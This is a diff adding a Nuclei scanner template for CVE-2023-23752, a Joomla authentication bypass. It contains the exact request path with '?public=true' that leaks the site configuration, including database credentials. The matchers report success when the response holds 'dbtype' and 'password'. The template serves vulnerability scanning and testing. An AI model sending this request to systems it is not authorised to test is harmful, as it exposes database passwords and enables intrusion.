@@ -1,0 +1,30 @@
+# Add your nuclei formatted PoC!
+id:  joomla-information-leak
+
+info:
+  name: joomla-information-leak
+  author: yoyo
+  severity: high
+  description: CVE-2023-23752 is an authentication bypass resulting in an information leak. Most of the public exploits use the bypass to leak the system's configuration, which contains the Joomla! MySQL database credentials in plaintext.
+  tags: CVE-2023-23752,oa
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/api/index.php/v1/config/application?public=true'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "dbtype"
+        part: body
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "password"
+        part: body
